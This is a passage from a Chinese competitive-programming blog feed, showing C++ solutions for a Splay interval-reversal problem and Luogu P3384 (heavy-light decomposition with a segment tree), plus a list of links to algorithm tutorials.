class="type">int</span> r)</span><span class="comment">//关于如何从Splay中提取区间请看上文思路中的论文</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="built_in">find</span>(rt,l),y=<span class="built_in">find</span>(rt,r+<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">splay</span>(x,rt);</span><br><span class="line">    <span class="built_in">splay</span>(y,ch[x][<span class="number">1</span>]);</span><br><span class="line">    <span class="type">int</span> z=ch[y][<span class="number">0</span>];</span><br><span class="line">    rev[z]^=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    rt=(n+<span class="number">3</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,n+<span class="number">2</span>,rt);<span class="comment">//区间左右各多加1个数方便提取区间</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> L,R;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;L,&amp;R);</span><br><span class="line">        <span class="built_in">rever</span>(L,R);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n+<span class="number">1</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,<span class="built_in">find</span>(rt,i)<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Splay </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3384 【模板】树链剖分</title>
      <link href="/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/"/>
      <url>/2018/02/22/%E6%B4%9B%E8%B0%B7P3384%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="//www.luogu.org/problemnew/show/P3384">https://www.luogu.org/problemnew/show/P3384</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>已知一棵包含N个结点的树（连通且无环），每个节点上包含一个数值，需要支持以下操作：  </p><ol><li>格式： 1 x y z 表示将树从x到y结点最短路径上所有节点的值都加上z  </li><li>格式： 2 x y 表示求树从x到y结点最短路径上所有节点的值之和  </li><li>格式： 3 x z 表示将以x为根节点的子树内所有节点值都加上z  </li><li>格式： 4 x 表示求以x为根节点的子树内所有节点值之和</li></ol><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>树链剖分裸题。做题时看到与四种操作中的任何一种极为相似的操作，就应该立刻想到树链剖分（并且考虑是否结合线段树解答）。<br>关于树链剖分的介绍请看此处：<a href="//www.cnblogs.com/yyy2015c01/p/8457795.html">信息学竞赛相关优秀文章合集</a>  </p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>具体介绍在注释里。<br>来源：洛谷用户<a href="//www.luogu.org/space/show?uid=47062">@zengqinyi</a>  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Rint register int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem(a,b) memset(a,(b),sizeof(a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Temp template<span class="string">&lt;typename T&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="function">Temp <span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    x=<span class="number">0</span>;T w=<span class="number">1</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch)&amp;&amp;ch!=<span class="string">&#x27;-&#x27;</span>)ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)w=<span class="number">-1</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))x=(x&lt;&lt;<span class="number">3</span>)+(x&lt;&lt;<span class="number">1</span>)+(ch^<span class="string">&#x27;0&#x27;</span>),ch=<span class="built_in">getchar</span>();</span><br><span class="line">    x=x*w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mid ((l+r)&gt;&gt;1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lson rt&lt;&lt;1,l,mid</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rson rt&lt;&lt;1|1,mid+1,r</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> len (r-l+1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">200000</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n,m,r,mod;</span><br><span class="line"><span class="comment">//见题意 </span></span><br><span class="line"><span class="type">int</span> e,beg[maxn],nex[maxn],to[maxn],w[maxn],wt[maxn];</span><br><span class="line"><span class="comment">//链式前向星数组，w[]、wt[]初始点权数组 </span></span><br><span class="line"><span class="type">int</span> a[maxn&lt;&lt;<span class="number">2</span>],laz[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="comment">//线段树数组、lazy操作 </span></span><br><span class="line"><span class="type">int</span> son[maxn],id[maxn],fa[maxn],cnt,dep[maxn],siz[maxn],top[maxn]; </span><br><span class="line"><span class="comment">//son[]重儿子编号,id[]新编号,fa[]父亲节点,cnt dfs_clock/dfs序,dep[]深度,siz[]子树大小,top[]当前链顶端节点 </span></span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//查询答案 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span> <span class="comment">//链式前向星加边 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    to[++e]=y;</span><br><span class="line">    nex[e]=beg[x];</span><br><span class="line">    beg[x]=e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-------------------------------------- 以下为线段树 </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> lenn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    laz[rt&lt;&lt;<span class="number">1</span>]+=laz[rt];</span><br><span class="line">    laz[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=laz[rt];</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>]+=laz[rt]*(lenn-(lenn&gt;&gt;<span class="number">1</span>));</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]+=laz[rt]*(lenn&gt;&gt;<span class="number">1</span>);</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>]%=mod;</span><br><span class="line">    a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>]%=mod;</span><br><span class="line">    laz[rt]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> l,<span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        a[rt]=wt[l];</span><br><span class="line">        <span class="keyword">if</span>(a[rt]&gt;mod)a[rt]%=mod;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(lson);</span><br><span class="line">    <span class="built_in">build</span>(rson);</span><br><span class="line">    a[rt]=(a[rt&lt;&lt;<span class="number">1</span>]+a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>])%mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> L,<span class="type">int</span> R)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L&lt;=l&amp;&amp;r&lt;=R) &#123;</span><br><span class="line">    res+=a[rt];</span><br><span class="line">    res%=mod;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(laz[rt])<span class="built_in">pushdown</span>(rt,len);</span><br><span class="line">        <span class="keyword">if</span>(L&lt;=mid)<span class="built_in">query</span>(lson,L,R);</span><br><span class="line">        <span class="keyword">if</span>(R&gt;mid)<span class="built_in">query</span>(rson,L,R);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> rt,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> L,<span class="type">int</span> R,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L&lt;=l&amp;&amp;r&lt;=R) &#123;</span><br><span class="line">        laz[rt]+=k;</span><br><span class="line">        a[rt]+=k*len;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(laz[rt])<span class="built_in">pushdown</span>(rt,len);</span><br><span class="line">        <span class="keyword">if</span>(L&lt;=mid)<span class="built_in">update</span>(lson,L,R,k);</span><br><span class="line">        <span class="keyword">if</span>(R&gt;mid)<span class="built_in">update</span>(rson,L,R,k);</span><br><span class="line">        a[rt]=(a[rt&lt;&lt;<span class="number">1</span>]+a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>])%mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//---------------------------------以上为线段树 </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">qRange</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(top[x]!=top[y]) &#123;<span class="comment">//当两个点不在同一条链上 </span></span><br><span class="line">        <span class="keyword">if</span>(dep[top[x]]&lt;dep[top[y]])</span><br><span class="line">        <span class="built_in">swap</span>(x,y);<span class="comment">//把x点改为所在链顶端的深度更深的那个点</span></span><br><span class="line">        res=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[top[x]],id[x]);<span class="comment">//ans加上x点到x所在链顶端 这一段区间的点权和</span></span><br><span class="line">        ans+=res;</span><br><span class="line">        ans%=mod;<span class="comment">//按题意取模 </span></span><br><span class="line">        x=fa[top[x]];<span class="comment">//把x跳到x所在链顶端的那个点的上面一个点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//直到两个点处于一条链上</span></span><br><span class="line">    <span class="keyword">if</span>(dep[x]&gt;dep[y])<span class="built_in">swap</span>(x,y);<span class="comment">//把x点深度更深的那个点</span></span><br><span class="line">    res=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[y]);<span class="comment">//这时再加上此时两个点的区间和即可</span></span><br><span class="line">    ans+=res;</span><br><span class="line">    <span class="keyword">return</span> ans%mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">updRange</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> k)</span> <span class="comment">//同上</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    k%=mod;</span><br><span class="line">    <span class="keyword">while</span>(top[x]!=top[y])&#123;</span><br><span class="line">        <span class="keyword">if</span>(dep[top[x]]&lt;dep[top[y]])</span><br><span class="line">        <span class="built_in">swap</span>(x,y);</span><br><span class="line">        <span class="built_in">update</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[top[x]],id[x],k);</span><br><span class="line">        x=fa[top[x]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dep[x]&gt;dep[y])<span class="built_in">swap</span>(x,y);</span><br><span class="line">    <span class="built_in">update</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[y],k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">qSon</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    res=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[x]+siz[x]<span class="number">-1</span>);<span class="comment">//子树区间右端点为id[x]+siz[x]-1 </span></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">updSon</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> k)</span> <span class="comment">//同上</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">update</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[x]+siz[x]<span class="number">-1</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> f,<span class="type">int</span> deep)</span> <span class="comment">//x当前节点，f父亲，deep深度 </span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    dep[x]=deep;<span class="comment">//标记每个点的深度 </span></span><br><span class="line">    fa[x]=f;<span class="comment">//标记每个点的父亲 </span></span><br><span class="line">    siz[x]=<span class="number">1</span>;<span class="comment">//标记每个非叶子节点的子树大小 </span></span><br><span class="line">    <span class="type">int</span> maxson=<span class="number">-1</span>;<span class="comment">//记录重儿子的儿子数 </span></span><br><span class="line">    <span class="keyword">for</span>(Rint i=beg[x];i;i=nex[i]) &#123;</span><br><span class="line">        <span class="type">int</span> y=to[i];</span><br><span class="line">        <span class="keyword">if</span>(y==f)</span><br><span class="line">        <span class="keyword">continue</span>;<span class="comment">//若为父亲则continue </span></span><br><span class="line">        <span class="built_in">dfs1</span>(y,x,deep+<span class="number">1</span>);<span class="comment">//dfs其儿子 </span></span><br><span class="line">        siz[x]+=siz[y];<span class="comment">//把它的儿子数加到它身上 </span></span><br><span class="line">        <span class="keyword">if</span>(siz[y]&gt;maxson)son[x]=y,maxson=siz[y];<span class="comment">//标记每个非叶子节点的重儿子编号 </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> topf)</span> <span class="comment">//x当前节点，topf当前链的最顶端的节点 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    id[x]=++cnt;<span class="comment">//标记每个点的新编号 </span></span><br><span class="line">    wt[cnt]=w[x];<span class="comment">//把每个点的初始值赋到新编号上来 </span></span><br><span class="line">    top[x]=topf;<span class="comment">//这个点所在链的顶端 </span></span><br><span class="line">    <span class="keyword">if</span>(!son[x])</span><br><span class="line">    <span class="keyword">return</span>;<span class="comment">//如果没有儿子则返回 </span></span><br><span class="line">    <span class="built_in">dfs2</span>(son[x],topf);<span class="comment">//按先处理重儿子，再处理轻儿子的顺序递归处理 </span></span><br><span class="line">    <span class="keyword">for</span>(Rint i=beg[x];i;i=nex[i]) &#123;</span><br><span class="line">        <span class="type">int</span> y=to[i];</span><br><span class="line">        <span class="keyword">if</span>(y==fa[x]||y==son[x])<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dfs2</span>(y,y);<span class="comment">//对于每一个轻儿子都有一条从它自己开始的链 </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n);</span><br><span class="line">    <span class="built_in">read</span>(m);</span><br><span class="line">    <span class="built_in">read</span>(r);</span><br><span class="line">    <span class="built_in">read</span>(mod);</span><br><span class="line">    <span class="keyword">for</span>(Rint i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">read</span>(w[i]);</span><br><span class="line">    <span class="keyword">for</span>(Rint i=<span class="number">1</span>;i&lt;n;i++) &#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        <span class="built_in">read</span>(a);<span class="built_in">read</span>(b);</span><br><span class="line">        <span class="built_in">add</span>(a,b);<span class="built_in">add</span>(b,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs1</span>(r,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dfs2</span>(r,r);</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">while</span>(m--) &#123;</span><br><span class="line">        <span class="type">int</span> k,x,y,z;</span><br><span class="line">        <span class="built_in">read</span>(k);</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);<span class="built_in">read</span>(y);<span class="built_in">read</span>(z);</span><br><span class="line">            <span class="built_in">updRange</span>(x,y,z);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(k==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);<span class="built_in">read</span>(y);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">qRange</span>(x,y));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(k==<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);<span class="built_in">read</span>(y);</span><br><span class="line">            <span class="built_in">updSon</span>(x,y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">qSon</span>(x));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数链剖分 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息学竞赛相关优秀文章合集</title>
      <link href="/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/"/>
      <url>/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><a href="//blog.csdn.net/zearot/article/details/48299459">线段树详解 （原理，实现与应用）</a><br><a href="//blog.csdn.net/lyd_7_29/article/details/51405469">可持久化线段树 简介</a>  </p><p><a href="//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf">运用伸展树解决数列维护问题.pdf</a><br><a href="//oi.men.ci/splay-notes-1/">Splay 学习笔记（一）</a><br><a href="//oi.men.ci/splay-notes-2/">Splay 学习笔记（二）</a><br><a href="//oi.men.ci/splay-notes-3/">Splay 学习笔记（三）</a>   </p><p><a href="//lib.csdn.net/article/datastructure/9204">请要相信我，30分钟让你掌握AVL树（平衡二叉树）</a><br><a href="//blog.csdn.net/sun_tttt/article/details/65445754">最容易懂的红黑树</a><br><a href="//www.cnblogs.com/Mathics/p/3971220.html">三大平衡树（Treap + Splay + SBT）总结+模板</a><br><a href="//oi.men.ci/link-cut-tree-notes/">Link-Cut Tree 学习笔记</a><br><a href="//files.cnblogs.com/files/yyy2015c01/%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A0%94%E7%A9%B6.pdf">可持久化数据结构研究.pdf</a>  </p><p><a href="//www.cnblogs.com/dalt/p/8206664.html">树链剖分详解</a><br><a href="//www.cnblogs.com/chinhhh/p/7965433.html">树链剖分详解（洛谷模板 P3384）</a>  </p><p><a href="//blog.csdn.net/PomeCat/article/details/72832494">动态规划（DP）优化之斜率优化讲解</a><br><a href="//www.cnblogs.com/MashiroSky/p/6009685.html">斜率优化学习笔记</a><br><a href="//www.cnblogs.com/mlystdcall/p/6525962.html">四边形不等式学习笔记</a><br><a href="//www.yhzq-blog.cc/%E6%8F%92%E5%A4%B4dp-%E4%BB%8E%E4%B8%8D%E4%BC%9A%E5%88%B0%E5%B4%A9%E6%BA%83/">插头dp入门</a>  </p><p><a href="//segmentfault.com/a/1190000003914228">最长回文子串——Manacher 算法（人称“马拉车算法”）</a>  </p><p><a href="//www.cnblogs.com/mlystdcall/p/6734852.html">上下界网络流建模方法总结</a>   </p><p><a href="//www.gatevin.moe/acm/fft%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">FFT算法学习笔记</a><br><a href="//www.cnblogs.com/tmzbot/p/4668158.html">Fast Walsh-Hadamard Transform（快速沃尔什变换）</a>  </p><p><a href="//www.cnblogs.com/mlystdcall/p/6219421.html">简易CDQ分治教程&amp;学习笔记</a><br><a href="//www.cnblogs.com/mlystdcall/p/6232324.html">四维偏序(CDQ套CDQ)</a></p>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3919 【模板】可持久化数组（可持久化线段树/平衡树）</title>
      <link href="/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/"/>
      <url>/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/</url>
      
